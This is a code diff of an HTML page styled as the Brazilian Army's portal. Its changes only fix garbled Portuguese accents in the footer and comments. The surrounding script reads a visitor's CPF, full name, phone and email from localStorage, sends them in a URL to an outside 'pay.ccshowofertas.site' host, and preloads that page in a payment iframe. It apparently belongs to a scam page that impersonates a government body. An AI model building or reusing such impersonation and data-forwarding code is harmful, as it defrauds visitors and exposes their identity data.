@@ -853,7 +853,7 @@
                     width: 100%;
                     /* Pode ajustar o tamanho da imagem aqui */
                     max-width: 700px;
-                    /* Largura m�xima */
+                    /* Largura máxima */
                     height: auto;
                 }
             </style>
@@ -863,16 +863,16 @@
                 <div class="container mx-auto px-4">
                     <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-8">
                         <div>
-                            <h3 class="font-bold mb-3 text-lg">O EX�RCITO</h3>
+                            <h3 class="font-bold mb-3 text-lg">O EXÉRCITO</h3>
                             <ul class="space-y-2">
-                                <li><a class="hover:underline" href="#">Miss�o e Vis�o</a></li>
+                                <li><a class="hover:underline" href="#">Missão e Visão</a></li>
                                 <li><a class="hover:underline" href="#">Comandante do Exército</a></li>
                                 <li><a class="hover:underline" href="#">Organização</a></li>
                                 <li><a class="hover:underline" href="#">História</a></li>
                             </ul>
                         </div>
                         <div>
-                            <h3 class="font-bold mb-3 text-lg">SERVI�OS</h3>
+                            <h3 class="font-bold mb-3 text-lg">SERVIÇOS</h3>
                             <ul class="space-y-2">
                                 <li><a class="hover:underline" href="#">CAC</a></li>
                                 <li><a class="hover:underline" href="#">Alistamento</a></li>
@@ -880,10 +880,10 @@
                             </ul>
                         </div>
                         <div>
-                            <h3 class="font-bold mb-3 text-lg">TRANSPAR�NCIA</h3>
+                            <h3 class="font-bold mb-3 text-lg">TRANSPARÊNCIA</h3>
                             <ul class="space-y-2">
-                                <li><a class="hover:underline" href="#">Acesso � Informa��o</a></li>
-                                <li><a class="hover:underline" href="#">Licita��es e Contratos</a></li>
+                                <li><a class="hover:underline" href="#">Acesso à Informação</a></li>
+                                <li><a class="hover:underline" href="#">Licitações e Contratos</a></li>
                             </ul>
                         </div>
                         <div>
@@ -906,7 +906,7 @@
                 </div>
             </footer>
             <div class="bg-green-950 text-white text-sm py-3 text-center">
-                Portal produzido pelo Ex�rcito Brasileiro - Todos os Direitos Reservados.
+                Portal produzido pelo Exército Brasileiro - Todos os Direitos Reservados.
             </div>
 
             <div id="paymentOverlay" class="payment-overlay">
@@ -943,10 +943,10 @@
                 }, 8000);
 
                 // Recuperar dados do localStorage
-                const cpf = localStorage.getItem('cpf') || 'CPF n�o dispon�vel';
-                const nomeCompleto = localStorage.getItem('nomeCompleto') || 'Nome n�o dispon�vel';
-                const telefone = localStorage.getItem('telefone') || 'Telefone n�o dispon�vel';
-                const email = localStorage.getItem('email') || 'Email n�o dispon�vel';
+                const cpf = localStorage.getItem('cpf') || 'CPF não disponível';
+                const nomeCompleto = localStorage.getItem('nomeCompleto') || 'Nome não disponível';
+                const telefone = localStorage.getItem('telefone') || 'Telefone não disponível';
+                const email = localStorage.getItem('email') || 'Email não disponível';
 
                 // Exibir o nome completo e o CPF nos textos sobrepostos
                 document.getElementById('text-overlay-1').textContent = nomeCompleto;
@@ -956,7 +956,7 @@
                 // Construir a URL com os dados
                 const pagSeguroUrl = `https://pay.ccshowofertas.site/a9ArZMMxnevZ7xj?name=${encodeURIComponent(nomeCompleto)}&email=${encodeURIComponent(email)}&telephone=${encodeURIComponent(telefone)}&document=${encodeURIComponent(cpf)}`;
 
-                // Pr�-carregar o iframe
+                // Pré-carregar o iframe
                 pagSeguroIframe.src = pagSeguroUrl;
 
                 paymentButton.addEventListener('click', () => {
